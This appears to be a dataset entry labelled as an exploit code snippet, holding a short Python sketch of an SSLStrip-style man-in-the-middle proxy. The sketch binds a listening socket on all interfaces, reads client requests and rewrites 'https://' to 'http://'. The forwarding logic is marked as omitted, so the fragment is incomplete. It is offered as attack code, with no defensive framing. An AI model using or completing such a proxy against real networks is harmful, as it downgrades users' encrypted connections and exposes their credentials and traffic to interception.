technical_data.exploit_code_snippet:
import socket

# Simple SSLStrip MITM proxy example
LISTEN_ADDR = '0.0.0.0'
LISTEN_PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_ADDR, LISTEN_PORT))
s.listen(5)

while True:
    client, addr = s.accept()
    data = client.recv(4096)
    # Strip https requests to http
    modified_data = data.replace(b'https://', b'http://')
    # Forward to server
    # ... (omitted for brevity)
